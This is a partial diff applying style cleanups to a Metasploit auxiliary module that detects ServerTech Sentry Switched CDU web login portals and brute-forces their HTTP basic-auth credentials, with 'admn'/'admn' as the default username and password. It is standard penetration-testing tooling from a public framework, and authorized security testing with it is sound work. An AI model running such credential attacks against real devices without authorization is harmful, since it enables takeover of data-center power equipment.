@@ -3,37 +3,38 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'Sentry Switched CDU Bruteforce Login Utility',
-      'Description'    => %{
-        This module scans for ServerTech's Sentry Switched CDU (Cabinet Power
-        Distribution Unit) web login portals, and performs login brute force
-        to identify valid credentials.
-      },
-      'Author'         =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Sentry Switched CDU Bruteforce Login Utility',
+        'Description' => %q{
+          This module scans for ServerTech's Sentry Switched CDU (Cabinet Power
+          Distribution Unit) web login portals, and performs login brute force
+          to identify valid credentials.
+        },
+        'Author' => [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
         ],
-      'License'        => MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE
+      )
+    )
 
     register_options(
       [
-        OptString.new('USERNAME', [true, "A specific username to authenticate as, default 'admn'", "admn"]),
-        OptString.new('PASSWORD', [true, "A specific password to authenticate with, deault 'admn'", "admn"])
-      ])
+        OptString.new('USERNAME', [true, "A specific username to authenticate as, default 'admn'", 'admn']),
+        OptString.new('PASSWORD', [true, "A specific password to authenticate with, deault 'admn'", 'admn'])
+      ]
+    )
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     unless is_app_sentry?
       print_error("#{rhost}:#{rport} - Sentry Switched CDU not found. Module will not continue.")
       return
@@ -51,15 +52,16 @@ class MetasploitModule < Msf::Auxiliary
   def is_app_sentry?
     begin
       res = send_request_cgi(
-      {
-        'uri'       => '/',
-        'method'    => 'GET'
-      })
+        {
+          'uri' => '/',
+          'method' => 'GET'
+        }
+      )
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
       return false
     end
 
-    if (res and res.body.include?("Sentry Switched CDU"))
+    if (res && res.body.include?('Sentry Switched CDU'))
       vprint_good("#{rhost}:#{rport} - Running ServerTech Sentry Switched CDU")
       return true
     else
@@ -101,13 +103,14 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}")
     begin
       res = send_request_cgi(
-      {
-        'uri'       => '/index.html',
-        'method'    => 'GET',
-        'authorization' => basic_auth(user,pass)
-      })
+        {
+          'uri' => '/index.html',
+          'method' => 'GET',
+          'authorization' => basic_auth(user, pass)
+        }
+      )
 
-      if res and !res.get_cookies.empty?
+      if res && !res.get_cookies.empty?
         print_good("#{rhost}:#{rport} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
 
         report_cred(
@@ -123,7 +126,6 @@ class MetasploitModule < Msf::Auxiliary
       else
         vprint_error("#{rhost}:#{rport} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
       end
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
       print_error("#{rhost}:#{rport} - HTTP Connection Failed, Aborting")
       return :abort
